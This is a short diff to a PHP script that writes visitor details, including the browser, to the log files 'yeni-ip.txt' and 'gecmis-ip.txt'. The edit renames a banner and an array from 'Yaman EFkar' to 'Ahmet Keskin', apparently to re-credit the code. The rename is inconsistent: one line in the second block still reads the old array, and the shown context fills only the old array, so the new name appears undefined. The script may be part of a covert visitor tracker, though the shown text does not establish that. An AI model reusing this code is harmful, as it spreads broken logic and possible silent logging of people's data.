@@ -47,12 +47,12 @@ $yamanefkar["10"] = "Tarayıcı : ".$tarayici;
 
 $ac = fopen("yeni-ip.txt","a+");
 
-$veriler = ("-----------Yaman EFkar-----------\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n\n");
+$veriler = ("-----------Ahmet Keskin-----------\n".$ahmetkeskin["0"]."\n".$ahmetkeskin["1"]."\n".$ahmetkeskin["2"]."\n".$ahmetkeskin["3"]."\n".$ahmetkeskin["4"]."\n".$ahmetkeskin["5"]."\n".$ahmetkeskin["6"]."\n".$ahmetkeskin["7"]."\n".$ahmetkeskin["8"]."\n".$ahmetkeskin["9"]."\n".$ahmetkeskin["10"]."\n\n\n");
 fwrite($ac,$veriler);
 fclose($ac);
 
 $ac = fopen("gecmis-ip.txt","a+");
-$veriler = ("-----------Yaman EFkar-----------\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n\n");
+$veriler = ("-----------Ahmet Keskin-----------\n".$ahmetkeskin["0"]."\n".$ahmetkeskin["1"]."\n".$ahmetkeskin["2"]."\n".$yamanefkar["3"]."\n".$ahmetkeskin["4"]."\n".$ahmetkeskin["5"]."\n".$ahmetkeskin["6"]."\n".$ahmetkeskin["7"]."\n".$ahmetkeskin["8"]."\n".$ahmetkeskin["9"]."\n".$ahmetkeskin["10"]."\n\n\n");
 fwrite($ac,$veriler);
 fclose($ac);
 
